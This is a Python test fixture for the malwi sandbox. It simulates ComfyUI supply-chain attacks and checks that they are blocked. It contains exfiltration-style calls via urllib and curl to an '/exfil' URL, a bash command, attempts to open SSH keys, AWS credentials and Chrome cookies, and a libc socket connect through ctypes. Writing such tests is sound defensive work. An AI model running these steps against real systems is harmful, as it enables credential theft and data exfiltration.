# Test fixture: Simulates attack vectors from real ComfyUI supply chain attacks.
# Run under malwi with the comfyui policy to verify all vectors are blocked.
#
# Based on real attacks:
#   - Upscaler-4K (Oct 2024): stealer binary + credential theft
#   - CryptoMiner nodes: coin miner deployment via urllib
#   - Discord token stealers: browser data + env var exfiltration
#
# Usage:
#   malwi x python tests/fixtures/malicious-comfyui-node/run_attacks.py
#
# Expected: all attacks blocked, exit code 0

import os
import subprocess
import sys

results = []


def attack(name, fn):
    """Run an attack vector and verify malwi blocks it."""
    try:
        result = fn()
        if result is True:
            # Explicitly marked as passed by the test function
            results.append(("PASS", name, "blocked"))
        else:
            results.append(("FAIL", name, "executed without error"))
    except (PermissionError, OSError, SystemError) as e:
        # PermissionError: Python-level block
        # OSError with EACCES: native-level block
        # SystemError: native hook returned NULL (open() hook)
        results.append(("PASS", name, str(e)[:80]))
    except Exception as e:
        # Any other exception during an attack is still a "block" —
        # the operation didn't succeed
        results.append(("PASS", name, f"{type(e).__name__}: {str(e)[:60]}"))


def attack_subprocess(name, cmd):
    """Test that a subprocess command is blocked (non-zero exit)."""
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=5)
        if r.returncode != 0:
            results.append(("PASS", name, f"exit code {r.returncode}"))
        else:
            results.append(("FAIL", name, f"executed: {r.stdout[:50]}"))
    except Exception as e:
        results.append(("PASS", name, f"{type(e).__name__}: {str(e)[:60]}"))


# ── Network exfiltration (blocked by network allowlist) ──────────

attack(
    "network_urllib",
    lambda: __import__("urllib.request").request.urlopen(
        "https://canvascomputing.org/exfil", timeout=2
    ),
)

# ── Command execution (blocked by commands deny) ─────────────────

attack_subprocess(
    "cmd_curl",
    ["curl", "-s", "https://canvascomputing.org/exfil"],
)

attack_subprocess(
    "cmd_bash",
    ["bash", "-c", "id"],
)

# ── Credential file theft (blocked by files deny) ────────────────

attack(
    "file_ssh_key",
    lambda: open(os.path.expanduser("~/.ssh/id_rsa")),
)

attack(
    "file_aws_creds",
    lambda: open(os.path.expanduser("~/.aws/credentials")),
)

attack(
    "file_chrome_cookies",
    lambda: open(
        os.path.expanduser(
            "~/Library/Application Support/Google/Chrome/Default/Cookies"
        ),
        "rb",
    ),
)

# ── Native code loading + network via ctypes ─────────────────────
# ctypes.CDLL is warned (not denied) — but syscalls from the loaded
# library ARE caught by native hooks. Verify: loading libc and calling
# connect() through it is still blocked by the network allowlist.

def ctypes_network_exfil():
    """Load libc via ctypes and attempt socket connect — blocked at native level."""
    import ctypes
    import ctypes.util
    import struct
    libc = ctypes.CDLL(None)  # load libc — this is legitimate
    # Create a socket
    fd = libc.socket(2, 1, 0)  # AF_INET, SOCK_STREAM, 0
    if fd < 0:
        raise PermissionError("socket() blocked by native hook")
    # Try to connect to a non-allowed host — should be blocked
    addr = struct.pack("!HH4s8s", 2, 443, b"\x7f\x00\x00\x01", b"\x00" * 8)
    result = libc.connect(fd, addr, 16)
    libc.close(fd)
    if result < 0:
        raise PermissionError("connect() blocked by native hook")

attack("ctypes_network_via_libc", ctypes_network_exfil)

# ── Print results ─────────────────────────────────────────────────

passed = sum(1 for s, _, _ in results if s == "PASS")
failed = sum(1 for s, _, _ in results if s == "FAIL")

for status, name, detail in results:
    print(f"  [{status}] {name}: {detail}")

print(f"\nAttacks blocked: {passed}/{passed + failed}")
sys.exit(0 if failed == 0 else 1)
